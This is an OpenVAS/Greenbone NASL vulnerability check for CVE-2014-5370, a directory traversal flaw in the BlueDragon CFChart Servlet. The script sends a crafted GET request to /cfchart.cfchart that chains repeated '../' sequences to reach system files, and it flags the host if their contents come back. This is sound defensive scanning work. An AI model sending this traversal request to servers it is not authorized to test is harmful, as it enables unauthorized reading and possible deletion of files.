if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805068" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-5370" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-05-06 11:43:39 +0530 (Wed, 06 May 2015)" );
	script_name( "BlueDragon CFChart Servlet Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "BlueDragon/banner" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Apr/49" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/131504" );
	script_xref( name: "URL", value: "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5370/" );
	script_tag( name: "summary", value: "This host is running BlueDragon CFChart
  Servlet and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read file or not." );
	script_tag( name: "insight", value: "The flaw is due to the /cfchart.cfchart
  script not properly sanitizing user input, specifically path traversal style
  attacks (e.g. '../'). With a specially crafted request, a remote attacker
  can gain access to or delete arbitrary files." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attackers to download arbitrary files from an affected server and
  to also potentially see those files deleted after retrieval." );
	script_tag( name: "affected", value: "BlueDragon CFChart Servlet 7.1.1.17759" );
	script_tag( name: "solution", value: "Upgrade to BlueDragon CFChart Servlet
  7.1.1.18527 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_xref( name: "URL", value: "http://www.newatlanta.com/products/bluedragon/index.cfm" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
http_port = http_get_port( default: 80 );
Banner = http_get_remote_headers( port: http_port );
if(!Banner || !ContainsString( Banner, "BlueDragon Server" )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = "/cfchart.cfchart?" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, pattern: file )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

